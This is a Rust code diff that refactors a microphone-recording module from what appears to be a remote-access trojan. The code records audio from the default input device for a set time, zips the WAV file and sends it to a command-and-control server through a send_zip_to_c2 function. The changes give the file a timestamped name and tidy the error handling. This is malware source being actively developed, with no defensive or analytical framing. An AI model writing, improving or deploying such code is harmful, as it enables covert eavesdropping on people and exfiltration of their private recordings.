@@ -1,10 +1,11 @@
 use anyhow::Result;
+use chrono::Local;
 use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};
 use hound::{WavSpec, WavWriter};
+use std::path::PathBuf;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Arc, Mutex, OnceLock};
 use std::time::Duration;
-use tempfile::NamedTempFile;
 use tokio::sync::Mutex as AsyncMutex;
 
 use crate::connexion::{send_zip_to_c2, zip_file};
@@ -17,15 +18,21 @@ static MIC_REC_STATE: OnceLock<Arc<tokio::sync::Mutex<MicRecStatus>>> = OnceLock
 
 static MIC_REC_FLAG: OnceLock<Arc<AtomicBool>> = OnceLock::new();
 
+fn build_temp_wav_path() -> PathBuf {
+    let filename = Local::now()
+        .format("mic_recording_%d-%m-%Y_%H-%M-%S.wav")
+        .to_string();
+    let mut path = std::env::temp_dir();
+    path.push(filename);
+    path
+}
+
 pub async fn record_mic(duration_secs: u64) -> Result<()> {
     let host = cpal::default_host();
 
-    let device = match host.default_input_device() {
-        Some(device) => device,
-        None => {
-            return Err(anyhow::anyhow!("No input device available"));
-        }
-    };
+    let device = host
+        .default_input_device()
+        .ok_or_else(|| anyhow::anyhow!("No input device available"))?;
 
     let config = device.default_input_config()?;
 
@@ -36,11 +43,8 @@ pub async fn record_mic(duration_secs: u64) -> Result<()> {
         sample_format: hound::SampleFormat::Int,
     };
 
-    let temp_file = NamedTempFile::new()?;
-    let mut temp_path = temp_file.path().to_path_buf();
-    temp_path.set_extension("wav");
-
-    let writer_sync = Arc::new(Mutex::new(Some(WavWriter::create(&temp_path, spec)?)));
+    let wav_path = build_temp_wav_path();
+    let writer_sync = Arc::new(Mutex::new(Some(WavWriter::create(&wav_path, spec)?)));
     let writer_async = Arc::new(AsyncMutex::new(writer_sync.clone()));
     let writer_clone = writer_sync.clone();
 
@@ -88,13 +92,11 @@ pub async fn record_mic(duration_secs: u64) -> Result<()> {
             err_fn,
             None,
         )?,
-        _ => return Err(anyhow::anyhow!("No input device available")),
+        _ => return Err(anyhow::anyhow!("Unsupported sample format")),
     };
 
     stream.play()?;
-
     tokio::time::sleep(Duration::from_secs(duration_secs)).await;
-
     drop(stream);
 
     let writer_sync = writer_async.lock().await;
@@ -105,7 +107,7 @@ pub async fn record_mic(duration_secs: u64) -> Result<()> {
         }
     }
 
-    let zip_file = zip_file(&temp_path).await?;
+    let zip_file = zip_file(&wav_path).await?;
     let zip_path = zip_file.path();
 
     let _ = send_zip_to_c2(zip_path).await;
